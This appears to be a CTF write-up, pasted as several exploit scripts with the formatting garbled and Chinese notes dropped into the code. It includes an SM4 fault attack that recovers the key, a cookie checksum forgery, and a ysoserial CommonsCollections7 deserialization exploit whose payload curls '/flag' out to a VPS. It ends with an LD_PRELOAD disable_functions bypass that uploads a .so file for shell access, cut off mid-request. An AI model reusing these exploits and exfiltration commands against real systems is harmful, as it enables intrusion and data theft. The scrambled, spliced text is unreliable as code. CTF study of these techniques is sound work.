result = [singleState(A, index) ^ x for x in result]
else:
result = []
print("Error: empty key candidate!")
return result
def crack_bytes(roundFaultList, ref,  verbose=1):
candidates = [[], [], [], []]
key = [None] * 4
_, index = check(ref, init=True)
for faultCipher in roundFaultList:
_, index = check(faultCipher)
if index is not None:
if key[index] is not None:
continue
else:
if verbose > 2:
print("bad fault cipher:")
dump_byte(faultCipher)
continue
if verbose > 1:
print("key index at %d" % (index))
c = get_candidates(faultCipher, ref, index,  verbose)
if not candidates[index]:
# initial candidate state
candidates[index] = c
else:
candidates[index] = intersect(candidates[index], c)
# get the exact key
if (len(candidates[index]) == 1):
key[index] = candidates[index][0]
if verbose > 1:
print("Round key bytes recovered:")
print(''.join(["%02X" % x if x is not None else ".." for x in key]))
# check whether all key bytes have been recovered
for byte in key:
if(byte is None):
print("Only partly recovered:")
print(''.join(["%02X" % x if x is not None else ".." for x in key]))
return None
return get_uint32_le(key)
def foo():
masterKey = b'\x01\x23\x45\x67\x89\xab\xcd\xef\xfe\xdc\xba\x98\x76\x54\x32\x10'
in_put = b'\x01\x23\x45\x67\x89\xab\xcd\xef\xfe\xdc\xba\x98\x76\x54\x32\x10'
# last_round_key = [k31, k30, k29, k28]
#last_round_key = [0x9124a012, 0x01cf72e5 ,0x62293496, 0x428d3654]
sk = set_key(masterKey, SM4_ENCRYPT)
#print("fault output:")
r31 = [gen_fault_cipher(in_put, sk, 30) for i in range(30)]
r30 = [gen_fault_cipher(in_put, sk, 30) for i in range(30)]
r29 = [gen_fault_cipher(in_put, sk, 29) for i in range(30)]
r28 = [gen_fault_cipher(in_put, sk, 28) for i in range(30)]
last_round_key = []
key_schedule = []
last_round_key.append(crack_round(r31, ref))
last_round_key.append(crack_round(r30, ref, last_round_key))
last_round_key.append(crack_round(r29, ref, last_round_key))
last_round_key.append(crack_round(r28, ref, last_round_key))
key_schedule = recovery_key(last_round_key)
MK = get_masterKey(key_schedule)
print("Master Key found:")
dump_byte(MK)
def bar():
io = remote('39.101.134.52', 8006)
def passpow(postfix, res):
for answer in itertools.product(string.ascii_letters+string.digits, repeat=3):
answer = ''.join(answer).encode()
hashresult = hashlib.sha256(answer+postfix).hexdigest().encode()
if hashresult == res:
return answer
io.recvuntil("+")
postfix = io.recvuntil(")")[:-1]
io.recvuntil('== ')
res = io.recvuntil('\n')[:-1]
print(postfix, res)
answer = passpow(postfix, res)
print(answer)
io.sendlineafter(":", answer)
io.sendlineafter(":", "icqaf0ecae2322e454ba574617e58ef7")
io.recvuntil('your flag is\n')
cflag = io.recvuntil('\n')[:-1]
print(cflag)
in_put = b'\x01\x23\x45\x67\x89\xab\xcd\xef\xfe\xdc\xba\x98\x76\x54\x32\x10'
r31 = []
for _ in range(30):
io.sendlineafter("> ", '2')
io.sendlineafter(":", in_put.hex())
r, f, p = 31, random.randint(0, 256), random.randint(0, 16)
io.sendlineafter(":", f"{r} {f} {p}")
io.recvuntil(":")
r31.append(io.recvuntil('\n')[:-1].unhex()[:16])
r30 = []
for _ in range(30):
io.sendlineafter("> ", '2')
io.sendlineafter(":", in_put.hex())
r, f, p = 31, random.randint(0, 256), random.randint(0, 16)
io.sendlineafter(":", f"{r} {f} {p}")
io.recvuntil(":")
r30.append(io.recvuntil('\n')[:-1].unhex()[:16])
r29 = []
for _ in range(30):
io.sendlineafter("> ", '2')
io.sendlineafter(":", in_put.hex())
r, f, p = 30, random.randint(0, 256), random.randint(0, 16)
io.sendlineafter(":", f"{r} {f} {p}")
modestudy
套娃题 都是基本的block cipher攻击方式
io.recvuntil(":")
r29.append(io.recvuntil('\n')[:-1].unhex()[:16])
r28 = []
for _ in range(30):
io.sendlineafter("> ", '2')
io.sendlineafter(":", in_put.hex())
r, f, p = 29, random.randint(0, 256), random.randint(0, 16)
io.sendlineafter(":", f"{r} {f} {p}")
io.recvuntil(":")
r28.append(io.recvuntil('\n')[:-1].unhex()[:16])
io.sendlineafter("> ", '1')
io.sendlineafter(":", in_put.hex())
io.recvuntil(":")
ref = io.recvuntil('\n')[:-1].unhex()[:16]
last_round_key = []
key_schedule = []
last_round_key.append(crack_round(r31, ref, verbose=3))
last_round_key.append(crack_round(r30, ref, last_round_key, verbose=3))
last_round_key.append(crack_round(r29, ref, last_round_key, verbose=3))
last_round_key.append(crack_round(r28, ref, last_round_key, verbose=3))
key_schedule = recovery_key(last_round_key)
MK = get_masterKey(key_schedule)
print("Master Key found:")
print(MK.hex())
print(cflag)
# dump_byte(MK)
io.interactive()
bar()
# foo()
from zio import *
import string
import random
import hashlib
import time
def passpow(io, difficulty):
    io.read_until("[+] sha256(")
    prefix = io.read_until("+")[:-1]
    while 1:
        answer = ''.join(random.choice(string.ascii_letters + string.digits) for 
i in range(8))
        hashresult = hashlib.sha256(prefix+answer).digest()
        bits = ''.join(bin(ord(j))[2:].zfill(8) for j in hashresult)
        if bits.startswith('0'*difficulty):
            io.read_until("=")
            io.writeline(answer)
            return
ip = '106.14.66.172'
target = (ip, 7777)
io = zio(target, timeout=10000, print_read=COLORED(RAW, 'red'), 
print_write=COLORED(RAW, 'green'))
passpow(io, 5)
io.read_until("=")
io.writeline('icqaf0ecae2322e454ba574617e58ef7')
# challenge 1
io.read_until("your choice:")
io.writeline("1")
io.read_until("cookie:")
prefix = io.read_until("admin=0")
checksum = io.read_until('\n').strip().split('=')[1]
checksum = checksum[:30] + hex(int(checksum[30:32], 16) ^ 1)[2:] + checksum[32:]
io.writeline(prefix+";checksum="+checksum)
# challenge 2
io.read_until("your choice:")
io.writeline("2")
io.read_until("your choice:")
io.writeline("2")
io.writeline('413fb6edfd833cac1e78a1811fc3db10')
# challenge 3
io.read_until("your choice:")
io.writeline("3")
io.read_until("(cookie):")
checksum = io.read_until("\n").strip()
checksum = checksum[:64] + checksum[128:160] + checksum[96:]
io.writeline(checksum)
# challenge 4
io.read_until("your choice:")
io.writeline("4")
io.read_until("your choice:")
io.writeline("2")
io.writeline('405966114e5aae131bf7685b8f291043')
# secret = '405966114e5aae131bf7685b8f291043'
# while len(secret) exploit.txt
import requests
url = "http://39.101.166.142:8080/jdk_der"
with open ("exploit.txt", "rb") as f:
    data = f.read()
requests.post(url, data=data)
java -cp ysoserial-JRMPServer-0.0.1-all.jar ysoserial.exploit.JRMPListener 8012 
CommonsCollections7 'curl http:///vps:8013/ -d @/flag'
nc -lvvp 8013
import requests
from urllib.parse import quote
from base64 import b64encode
from pwn import *
#context.log_level = 'debug'
def upload_shell():
拿到shell权限是nobody，看到socat启了一个ctf
可以使用unix sock进行通信
    burp0_url = "http://39.99.249.211:80/a.php?
SCRIPT_FILENAME=/proc/self/environ&LD_PRELOAD=/etc/passwd"
    files = {'file': open('bypass_disablefunc_x64.so', 'rb')}
    a=requests.post(burp0_url, files=files)
#print(a.text)
    shell_dir = a.text.split('FILE_FILENAME_FILE=')[1].split('FILE_SIZE_FILE')
[0].replace('\x00','')
    print(shell_dir)
    return shell_dir
import os
def excute_cmd(cmd, shell_dir):
    body = '''GET /c.php?
SCRIPT_FILENAME=/etc/passwd&LD_PRELOAD='''+shell_dir+'''&EVIL_CMDLINE='''+quote(
cmd)+''' HTTP/1.1
Host: 39.99.249.211
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 